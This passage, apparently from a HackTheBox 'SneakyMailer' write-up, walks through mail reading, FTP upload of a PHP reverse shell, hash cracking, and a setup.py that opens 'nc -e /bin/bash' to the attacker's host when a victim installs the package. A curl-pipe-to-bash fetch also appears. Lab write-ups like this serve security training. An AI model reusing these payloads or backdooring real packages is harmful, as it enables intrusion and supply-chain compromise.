</pre></table></code></div></div><p>All are empty except the <code class="language-plaintext highlighter-rouge">INBOX.Sent Items</code></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">a</span> <span class="n">select</span> <span class="s">"INBOX.Sent Items"</span>
<span class="o">*</span> <span class="n">FLAGS</span> <span class="p">(</span>\<span class="n">Draft</span> \<span class="n">Answered</span> \<span class="n">Flagged</span> \<span class="n">Deleted</span> \<span class="n">Seen</span> \<span class="n">Recent</span><span class="p">)</span>
<span class="o">*</span> <span class="n">OK</span> <span class="p">[</span><span class="n">PERMANENTFLAGS</span> <span class="p">(</span>\<span class="o">*</span> \<span class="n">Draft</span> \<span class="n">Answered</span> \<span class="n">Flagged</span> \<span class="n">Deleted</span> \<span class="n">Seen</span><span class="p">)]</span> <span class="n">Limited</span>
<span class="o">*</span> <span class="mi">2</span> <span class="n">EXISTS</span>
<span class="o">*</span> <span class="mi">0</span> <span class="n">RECENT</span>
<span class="o">*</span> <span class="n">OK</span> <span class="p">[</span><span class="n">UIDVALIDITY</span> <span class="mi">589480766</span><span class="p">]</span> <span class="n">Ok</span>
<span class="o">*</span> <span class="n">OK</span> <span class="p">[</span><span class="n">MYRIGHTS</span> <span class="s">"acdilrsw"</span><span class="p">]</span> <span class="n">ACL</span>
<span class="n">a</span> <span class="n">OK</span> <span class="p">[</span><span class="n">READ</span><span class="o">-</span><span class="n">WRITE</span><span class="p">]</span> <span class="n">Ok</span>
</pre></table></code></div></div><p>and there are two mails that do exist</p><blockquote><p>reading email 1</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>a fetch 1 BODY.PEEK[]
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre>a fetch BODY.PEEK[]                                                                                     
<span class="k">*</span> 1 FETCH <span class="o">(</span>BODY[] <span class="o">{</span>2167<span class="o">}</span>                                                                                                                                                                                           
MIME-Version: 1.0
To: root &lt;root@debian&gt;
From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;
Subject: Password reset
Date: Fri, 15 May 2020 13:03:37 <span class="nt">-0500</span>
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative<span class="p">;</span>
        <span class="nv">boundary</span><span class="o">=</span><span class="s2">"_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"</span>

<span class="nt">--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_</span>
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span>

Hello administrator, I want to change this password <span class="k">for </span>the developer account

Username: developer
Original-Password: m^AsY7vTKVT+dV1<span class="o">{</span>WOU%@NaHkUAId3]C

Please notify me when you <span class="k">do </span><span class="nv">it</span><span class="o">=</span>20

<span class="nt">--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_</span>
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span>

&lt;html xmlns:o<span class="o">=</span>3D<span class="s2">"urn:schemas-microsoft-com:office:office"</span> xmlns:w<span class="o">=</span>3D<span class="s2">"urn:sc=
hemas-microsoft-com:office:word"</span> xmlns:m<span class="o">=</span>3D<span class="s2">"http://schemas.microsoft.com/of=
fice/2004/12/omml"</span> <span class="nv">xmlns</span><span class="o">=</span>3D<span class="s2">"http://www.w3.org/TR/REC-html40"</span><span class="o">&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;meta <span class="nv">ht</span><span class="o">=</span>
tp-equiv<span class="o">=</span>3DContent-Type <span class="nv">content</span><span class="o">=</span>3D<span class="s2">"text/html; charset=3Dutf-8"</span><span class="o">&gt;</span>&lt;meta <span class="nv">name</span><span class="o">=</span>
<span class="o">=</span>3DGenerator <span class="nv">content</span><span class="o">=</span>3D<span class="s2">"Microsoft Word 15 (filtered medium)"</span><span class="o">&gt;</span>&lt;style&gt;&lt;<span class="o">!</span><span class="nt">--</span>
/<span class="k">*</span> Font Definitions <span class="k">*</span>/
@font-face
        <span class="o">{</span>font-family:<span class="s2">"Cambria Math"</span><span class="p">;</span>
        panose-1:2 4 5 3 5 4 6 3 2 4<span class="p">;</span><span class="o">}</span>
@font-face
        <span class="o">{</span>font-family:Calibri<span class="p">;</span>
        panose-1:2 15 5 2 2 2 4 3 2 4<span class="p">;</span><span class="o">}</span>
/<span class="k">*</span> Style Definitions <span class="k">*</span>/
p.MsoNormal, li.MsoNormal, div.MsoNormal
        <span class="o">{</span>margin:0in<span class="p">;</span>
        margin-bottom:.0001pt<span class="p">;</span>
        font-size:11.0pt<span class="p">;</span>
        font-family:<span class="s2">"Calibri"</span>,sans-serif<span class="p">;</span><span class="o">}</span>
.MsoChpDefault
        <span class="o">{</span>mso-style-type:export-only<span class="p">;</span><span class="o">}</span>
@page WordSection1
        <span class="o">{</span>size:8.5in 11.0in<span class="p">;</span>
        margin:1.0in 1.0in 1.0in 1.0in<span class="p">;</span><span class="o">}</span>
div.WordSection1
        <span class="o">{</span>page:WordSection1<span class="p">;</span><span class="o">}</span>
<span class="nt">--</span><span class="o">&gt;</span>&lt;/style&gt;&lt;/head&gt;&lt;body <span class="nv">lang</span><span class="o">=</span>3DEN-US <span class="nb">link</span><span class="o">=</span>3Dblue <span class="nv">vlink</span><span class="o">=</span>3D<span class="s2">"#954F72"</span><span class="o">&gt;</span>&lt;div <span class="nv">cla</span><span class="o">=</span>
</pre></table></code></div></div><p>and the body of the email</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Hello administrator, I want to change this password <span class="k">for </span>the developer account

Username: developer
Original-Password: m^AsY7vTKVT+dV1<span class="o">{</span>WOU%@NaHkUAId3]C

Please notify me when you <span class="k">do </span><span class="nv">it</span><span class="o">=</span>20
</pre></table></code></div></div><p>The user is telling the admin to change the password for <code class="language-plaintext highlighter-rouge">developer</code> to <code class="language-plaintext highlighter-rouge">m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</code> , myabe the admin chaged the password we can check it somewhere</p><blockquote><p>reading email 2</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>a fetch 2 BODY.PEEK[]
<span class="k">*</span> 2 FETCH <span class="o">(</span>BODY[] <span class="o">{</span>585<span class="o">}</span>
To: low@debian
From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;
Subject: Module testing
Message-ID: &lt;4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb&gt;
Date: Wed, 27 May 2020 13:28:58 <span class="nt">-0400</span>
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:68.0<span class="o">)</span> Gecko/20100101
 Thunderbird/68.8.0
MIME-Version: 1.0
Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8<span class="p">;</span> <span class="nv">format</span><span class="o">=</span>flowed
Content-Transfer-Encoding: 7bit
Content-Language: en-US

Hello low


Your current task is to <span class="nb">install</span>, <span class="nb">test </span>and <span class="k">then </span>erase every python module you 
find <span class="k">in </span>our PyPI service, <span class="nb">let </span>me know <span class="k">if </span>you have any inconvenience.

<span class="o">)</span>
</pre></table></code></div></div><p>this seems to be for user <code class="language-plaintext highlighter-rouge">low</code> lets see it in future</p><h1 id="login-to-ftp">Login to Ftp</h1><p>I tested the developer on ssh but it didnt work there</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>➜  prashant ssh developer@sneakymailer.htb
developer@sneakymailer.htb<span class="s1">'s password: 
Permission denied, please try again.
developer@sneakymailer.htb'</span>s password: 
</pre></table></code></div></div><blockquote><p>Ftp</p></blockquote><p>and it worked on <code class="language-plaintext highlighter-rouge">ftp</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>➜  prashant ftp sneakymailer.htb
Connected to sneakymailer.htb.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>sneakymailer.htb:prashant<span class="o">)</span>: developer
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt;
</pre></table></code></div></div><p>There is one dir in here</p><blockquote><p>/dev</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jul 15 22:30 dev
226 Directory send OK.
ftp&gt;
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
drwxr-xr-x    2 0        0            4096 May 26 19:52 img
<span class="nt">-rwxr-xr-x</span>    1 0        0           13742 Jun 23 09:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 19:52 js
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
<span class="nt">-rwxr-xr-x</span>    1 0        0           26523 May 26 20:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
226 Directory send OK.
ftp&gt;
</pre></table></code></div></div><p>By looking at the <code class="language-plaintext highlighter-rouge">team.php</code> i consider it to be the dir that is on the website itself</p><p>I Downloaded the whole dev dir to my machine</p><blockquote><p>Downloading ftp dir</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>➜  prashant wget <span class="nt">-r</span> <span class="nt">-l</span> 10 <span class="nt">--ftp-user</span><span class="o">=</span><span class="s1">'developer'</span> <span class="nt">--ftp-password</span><span class="o">=</span><span class="s1">'m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C'</span> <span class="s2">"ftp://10.10.10.197/dev/*"</span>     
</pre></table></code></div></div><p>but after enumerating it manually , got nothing seriously rather than the <code class="language-plaintext highlighter-rouge">register.php</code> page in <strong>pypi</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/sneakymailer/07680b65-a21a-436c-b959-a9b35278f992/image-6.png" alt="register.php" /></p><p>and thats just a <code class="language-plaintext highlighter-rouge">dummy</code> <strong>page</strong> which do nothing , so left it</p><h2 id="uploading-files-to-ftp">Uploading files to ftp</h2><p>But one interesing thing i can upload files to the <code class="language-plaintext highlighter-rouge">ftp</code> , i m permitted to do so</p><blockquote><p>putting a test file</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>ftp&gt; put emails
<span class="nb">local</span>: emails remote: emails
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
1661 bytes sent <span class="k">in </span>0.00 secs <span class="o">(</span>2.2155 MB/s<span class="o">)</span>
ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
<span class="nt">--wxrw-rw-</span>    1 1001     1001         1661 Jul 15 23:50 emails
</pre></table></code></div></div><p>And it get uploaded , now since i know that its the website dir itself.So i can access the php shell using browser</p><blockquote><p>uploading shell</p></blockquote><p>The shell i am using is from <code class="language-plaintext highlighter-rouge">pentestmonkey</code></p><blockquote><p><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>ftp&gt; put prashant.php 
<span class="nb">local</span>: prashant.php remote: prashant.php
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5495 bytes sent <span class="k">in </span>0.00 secs <span class="o">(</span>7.3705 MB/s<span class="o">)</span>
ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
drwxr-xr-x    2 0        0            4096 May 26 19:52 img
<span class="nt">-rwxr-xr-x</span>    1 0        0           13742 Jun 23 09:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 19:52 js
<span class="nt">--wxrw-rw-</span>    1 1001     1001         5495 Jul 15 23:56 prashant.php
</pre></table></code></div></div><blockquote><p>accessing on website</p></blockquote><p>i can access my file by <code class="language-plaintext highlighter-rouge">http://sneakycorp.htb/prashant.php</code> , but it wasnt there</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/sneakymailer/07680b65-a21a-436c-b959-a9b35278f992/image-7.png" alt="404-error" /></p><p>Then after some time i think maybe there is another domain</p><h2 id="got-new-subdomain">Got new subdomain</h2><blockquote><p>Wfuzz to fuzz subdomain</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>➜  sneakymailer wfuzz <span class="nt">-H</span> <span class="s2">"HOST: FUZZ.sneakycorp.htb"</span> <span class="nt">-u</span> http://10.10.10.197/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">--hh</span> 185

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more information.

<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 2.4.5 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://10.10.10.197/
Total requests: 220560

<span class="o">===================================================================</span>
ID           Response   Lines    Word     Chars       Payload                                                                                                                                           
<span class="o">===================================================================</span>

000000007:   400        7 L      12 W     173 Ch      <span class="s2">"# license, visit http://creativecommons.org/licenses/by-sa/3.0/"</span>                                                                                 
000000009:   400        7 L      12 W     173 Ch      <span class="s2">"# Suite 300, San Francisco, California, 94105, USA."</span>                                                                                             
000000834:   200        340 L    989 W    13737 Ch    <span class="s2">"dev"</span>
</pre></table></code></div></div><p>and we got one <code class="language-plaintext highlighter-rouge">dev</code> itself lol..its the same dir name we had in ftp but nvm i got it now</p><p>And added it in the <strong>/etc/hosts</strong> file so i can access this <code class="language-plaintext highlighter-rouge">vhost</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/sneakymailer/07680b65-a21a-436c-b959-a9b35278f992/image-8.png" alt="dev.sneakycorp.htb" /></p><p>and it has the same interface as the domain has, i can try the shell in here</p><p>i uploaded my <code class="language-plaintext highlighter-rouge">php</code> file and tried accessing it on the website on <code class="language-plaintext highlighter-rouge">http://dev.sneakycorp.htb/prashant.php</code></p><h2 id="got-shell-as-www-data">Got shell as www-data</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>➜  prashant rlwrap nc <span class="nt">-nlvp</span> 1234 
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:41628.
Linux sneakymailer 4.19.0-9-amd64 <span class="c">#1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux</span>
 00:10:18 up 26 min,  0 <span class="nb">users</span>,  load average: 0.04, 0.10, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>715<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@sneakymailer:/<span class="err">$</span>
</pre></table></code></div></div><p>And i got the shell finally as www-data finally !!</p><p>and i can also switch to user <code class="language-plaintext highlighter-rouge">developer</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>www-data@sneakymailer:/<span class="nv">$ </span>su developer
su developer
Password: m^AsY7vTKVT+dV1<span class="o">{</span>WOU%@NaHkUAId3]C

developer@sneakymailer:/<span class="err">$</span>
</pre></table></code></div></div><p>There are two users in home dir</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>developer@sneakymailer:/home<span class="nv">$ </span><span class="nb">ls
ls
</span>low  vmail
</pre></table></code></div></div><p>The user.txt file is owen by the user <code class="language-plaintext highlighter-rouge">low</code></p><p>Now i decided to run the <code class="language-plaintext highlighter-rouge">Linemum.sh</code> for some automation enum and found a <code class="language-plaintext highlighter-rouge">.htpasswd</code> file from the user <strong>pypi</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>developer@sneakymailer:/tmp<span class="nv">$ </span>curl http://10.10.14.24:8080/LinEnum.sh | bash                                                                                                                                        
curl http://10.10.14.24:8080/LinEnum.sh | bash                                                           
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                          
                                 Dload  Upload   Total   Spent    Left  Speed                            
100 46476   57 26729    0     0  12519      0  0:00:03  0:00:02  0:00:01 12525476  100 46476    0     0  18908      0  0:00:02  0:00:02 <span class="nt">--</span>:--:-- 18908                                                             
                                                    
<span class="c">#########################################################                                                </span>
<span class="c"># Local Linux Enumeration &amp; Privilege Escalation Script #                                                </span>
<span class="c">#########################################################                                                </span>
<span class="c"># www.rebootuser.com                                                                                     </span>
<span class="c"># version 0.981                                 </span>
                                                                                                         
<span class="o">[</span>-] Debug Info                                                                                           
<span class="o">[</span>+] Thorough tests <span class="o">=</span> Disabled 
</pre></table></code></div></div><blockquote><p>.htpasswd</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">[</span>-] htpasswd found - could contain passwords:                                                            
/var/www/pypi.sneakycorp.htb/.htpasswd                                                                   
pypi:<span class="nv">$apr1$RV5c5YVs$U9</span>.OTqF5n8K4mxWpSSR/p/
</pre></table></code></div></div><p>And got this htpasswd file containg hash for user pypi</p><h2 id="cracking-hash-using-john">Cracking hash using john</h2><p>And i can crack the hash using john simply</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>➜  prashant john <span class="nb">hash</span> <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
Warning: detected <span class="nb">hash type</span> <span class="s2">"md5crypt"</span>, but the string is also recognized as <span class="s2">"md5crypt-long"</span>
Use the <span class="s2">"--format=md5crypt-long"</span> option to force loading these as that <span class="nb">type </span>instead
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
Will run 5 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
soufianeelhaoui  <span class="o">(</span>pypi<span class="o">)</span>
1g 0:00:00:12 DONE <span class="o">(</span>2020-07-16 00:43<span class="o">)</span> 0.07757g/s 277312p/s 277312c/s 277312C/s souheib2..sottod
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>Got it cracked , now what ?</p><p>Remember the email i got from the imap</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>Hello low


Your current task is to <span class="nb">install</span>, <span class="nb">test </span>and <span class="k">then </span>erase every python module you 
find <span class="k">in </span>our PyPI service, <span class="nb">let </span>me know <span class="k">if </span>you have any inconvenience.
</pre></table></code></div></div><p>Low have to install the pypi module , whatever module i will install will be installed by the user <code class="language-plaintext highlighter-rouge">low</code> interesting</p><h1 id="building-the-package">Building the package</h1><p>Now i just need to build a python package so that the user low can install it simply</p><blockquote><p><a href="https://pypi.org/project/pypiserver/#upload-with-setuptools" target="_blank">https://pypi.org/project/pypiserver/#upload-with-setuptools</a></p></blockquote><blockquote><p><a href="https://packaging.python.org/tutorials/packaging-projects/" target="_blank">https://packaging.python.org/tutorials/packaging-projects/</a></p></blockquote><blockquote><p><a href="https://packaging.python.org/guides/distributing-packages-using-setuptools/" target="_blank">https://packaging.python.org/guides/distributing-packages-using-setuptools/</a></p></blockquote><p>i have to make two files</p><ul><li>.pypirc<li>setup.py</ul><p>The file <code class="language-plaintext highlighter-rouge">.pypirc</code> which will authorize me and the setup.py which will be the package file that contains all the stuff we want to do</p><blockquote><p>Building .pypirc</p></blockquote><p>Referenced from here</p><blockquote><p><a href="https://pypi.org/project/pypiserver/#upload-with-setuptools" target="_blank">https://pypi.org/project/pypiserver/#upload-with-setuptools</a></p></blockquote><p>my <code class="language-plaintext highlighter-rouge">.pypirc</code> will looks like</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="o">[</span>distutils]
index-servers <span class="o">=</span> <span class="nb">local</span>

<span class="o">[</span><span class="nb">local</span><span class="o">]</span>
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
</pre></table></code></div></div><p>And my setup.py is referenced from here</p><blockquote><p><a href="https://packaging.python.org/tutorials/packaging-projects/" target="_blank">https://packaging.python.org/tutorials/packaging-projects/</a></p></blockquote><p>My setup.py will be giving me connection back , a reverse shell</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">setuptools</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">1000</span><span class="p">:</span>
        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'nc -e /bin/bash 10.10.14.24 2345'</span><span class="p">)</span>


<span class="n">setuptools</span><span class="p">.</span><span class="n">setup</span><span class="p">(</span>
        <span class="n">name</span><span class="o">=</span><span class="s">'sample'</span><span class="p">,</span>
        <span class="n">version</span><span class="o">=</span><span class="s">'1.2.0'</span><span class="p">,</span>
        <span class="n">description</span><span class="o">=</span><span class="s">'A sample Python project'</span><span class="p">,</span>
        <span class="n">long_description</span><span class="o">=</span><span class="s">"long_description"</span><span class="p">,</span>
        <span class="n">long_description_content_type</span><span class="o">=</span><span class="s">'text/x-rst'</span><span class="p">,</span>
        <span class="n">url</span><span class="o">=</span><span class="s">'https://github.com/pypa/sampleproject'</span><span class="p">,</span>
        <span class="n">author</span><span class="o">=</span><span class="s">'A. Random Developer'</span><span class="p">,</span>
        <span class="n">author_email</span><span class="o">=</span><span class="s">'author@example.com'</span><span class="p">,</span>
        <span class="n">license</span><span class="o">=</span><span class="s">'MIT'</span><span class="p">,</span>
        <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="p">.</span><span class="n">find_packages</span><span class="p">(),</span>
        <span class="n">install_requires</span><span class="o">=</span><span class="p">[</span><span class="s">'peppercorn'</span><span class="p">],</span>
<span class="p">)</span>
</pre></table></code></div></div><p>The userid that i used <code class="language-plaintext highlighter-rouge">1000</code> is of user low , because the file setup.py will be executed two time</p><ul><li>When the developer will run it<li>When low will test it as per the email</ul><p>So i want shell as <code class="language-plaintext highlighter-rouge">low</code> not <code class="language-plaintext highlighter-rouge">developer</code> , So the <strong>nc</strong> section will be executed when the user <code class="language-plaintext highlighter-rouge">low</code> will test the python package</p><h2 id="downloading-package">Downloading package</h2><p>Downloaded whole <code class="language-plaintext highlighter-rouge">pypi-pkg</code> dir using wget</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre>developer@sneakymailer:/tmp<span class="nv">$ </span>wget <span class="nt">-r</span> <span class="nt">--no-parent</span> http://10.10.14.24:8080/pypi-pkg                                                                                                                                  
&lt;get <span class="nt">-r</span> <span class="nt">--no-parent</span> http://10.10.14.24:8080/pypi-pkg                                                                                                                                                               
<span class="nt">--2020-07-16</span> 01:06:23--  http://10.10.14.24:8080/pypi-pkg                                                                                                                                                          
Connecting to 10.10.14.24:8080... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: /pypi-pkg/ <span class="o">[</span>following]
<span class="nt">--2020-07-16</span> 01:06:24--  http://10.10.14.24:8080/pypi-pkg/
Connecting to 10.10.14.24:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 294 <span class="o">[</span>text/html]
Saving to: ‘10.10.14.24:8080/pypi-pkg’

10.10.14.24:8080/py 100%[<span class="o">===================&gt;]</span>     294  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      

2020-07-16 01:06:25 <span class="o">(</span>23.1 MB/s<span class="o">)</span> - ‘10.10.14.24:8080/pypi-pkg’ saved <span class="o">[</span>294/294]


<span class="nt">--2020-07-16</span> 01:06:26--  http://10.10.14.24:8080/pypi-pkg/.pypirc
Connecting to 10.10.14.24:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 128 <span class="o">[</span>application/octet-stream]
Saving to: ‘10.10.14.24:8080/pypi-pkg/.pypirc’

10.10.14.24:8080/py 100%[<span class="o">===================&gt;]</span>     128  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      

2020-07-16 01:06:26 <span class="o">(</span>10.6 MB/s<span class="o">)</span> - ‘10.10.14.24:8080/pypi-pkg/.pypirc’ saved <span class="o">[</span>128/128]


<span class="nt">--2020-07-16</span> 01:06:28--  http://10.10.14.24:8080/pypi-pkg/setup.py
Connecting to 10.10.14.24:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 480 <span class="o">[</span>text/plain]
Saving to: ‘10.10.14.24:8080/pypi-pkg/setup.py’

10.10.14.24:8080/py 100%[<span class="o">===================&gt;]</span>     480  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      

2020-07-16 01:06:29 <span class="o">(</span>45.9 MB/s<span class="o">)</span> - ‘10.10.14.24:8080/pypi-pkg/setup.py’ saved <span class="o">[</span>480/480]
